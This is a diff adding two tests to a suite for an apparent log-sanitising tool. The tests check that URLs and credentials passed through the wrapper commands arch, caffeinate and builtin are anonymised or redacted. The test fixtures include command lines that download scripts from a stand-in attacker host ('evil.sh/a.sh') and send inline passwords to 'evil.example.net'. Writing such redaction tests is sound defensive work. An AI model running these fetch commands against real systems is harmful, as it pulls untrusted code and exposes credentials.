@@ -2278,6 +2278,24 @@ describe.skipIf(!fs.existsSync(JQ))('hosts', () => {
     }
   });
 
+  // Task 6 review round 1, I5: a URL behind caffeinate or arch in shell code is read like the child that gets it.
+  test('a URL behind caffeinate or arch in shell code is read like the child\'s', () => {
+    const input = [
+      run(1270, '/bin/sh', ['sh', '-c', 'arch -arm64 curl -o out.txt evil.sh/a.sh; caffeinate -i wget intranet/b.sh'], docs, 1),
+      run(1271, '/usr/bin/curl', ['curl', '-o', 'out.txt', 'evil.sh/a.sh'], docs, 2),
+      run(1272, '/usr/local/bin/wget', ['wget', 'intranet/b.sh'], docs, 3),
+    ].join('\n') + '\n';
+    for (const stdin of [false, true]) {
+      const r = runClean(stdin ? ['clean', '-i', '-', '-o', '-'] : ['clean', '-o', '-'], { input });
+      expect(r.status, r.stderr).toBe(0);
+      const args = events(r.out).map(e => e.event.exec.args as string[]);
+      expect(args[0]![2]).toBe(`arch -arm64 curl -o ${args[1]![2]} ${args[1]![3]}; caffeinate -i wget ${args[2]![1]}`);
+      expect(args[1]![3]).toMatch(/^evil\.sh\/name\d+\.sh$/);
+      expect(args[2]![1]).toMatch(/^host\d+\.internal\.invalid\/name\d+\.sh$/);
+      sameFindings(input, r.out);
+    }
+  });
+
   test('user info with a / in its password is removed whole, never in the key', () => {
     const input = [
       run(1220, '/usr/bin/curl', ['curl', '-o', '/dev/null', 'https://bob:p/w0rd@evil.example.net/x'], '/', 1),
@@ -2766,6 +2784,27 @@ describe.skipIf(!fs.existsSync(JQ))('secrets and data', () => {
       expect(r.out).not.toMatch(/Board|Minutes|AKIA/);
       expect(r.summary['redacted']).toBe('3');
       cleanKey(r.key);
+      sameFindings(input, r.out);
+    }
+  });
+
+  // Review round 1, I5: caffeinate, arch and builtin are wrappers too, so the program behind them is read.
+  test('credentials behind caffeinate, arch and builtin are redacted', () => {
+    const E = 'https://evil.example.net';
+    const input = [
+      run(1860, '/usr/bin/caffeinate', ['caffeinate', '-i', '-t', '60', 'curl', '-u', 'bob:pwMM', E], '/', 1),
+      run(1861, '/usr/bin/arch', ['arch', '-arm64', '-e', 'A=1', 'mysql', '-pARCHPW', 'db'], '/', 2),
+      run(1862, '/usr/bin/arch', ['arch', '-arch', 'x86_64', 'curl', '-u', 'bob:pwXX', E], '/', 3),
+      run(1863, '/bin/sh', ['sh', '-c', `builtin command caffeinate -w 42 curl -u bob:pwYY ${E}`], '/', 4),
+    ].join('\n') + '\n';
+    for (const r of both(input)) {
+      const args = events(r.out).map(e => e.event.exec.args as string[]);
+      const R = '<redacted>';
+      expect(args[0]).toEqual(['caffeinate', '-i', '-t', '60', 'curl', '-u', R, E]);
+      expect(args[1]).toEqual(['arch', '-arm64', '-e', 'A=1', 'mysql', `-p${R}`, 'db']);
+      expect(args[2]).toEqual(['arch', '-arch', 'x86_64', 'curl', '-u', R, E]);
+      expect(args[3]![2]).toBe(`builtin command caffeinate -w 42 curl -u ${R} ${E}`);
+      expect(r.out).not.toMatch(/pwMM|ARCHPW|pwXX|pwYY/);
       sameFindings(input, r.out);
     }
   });
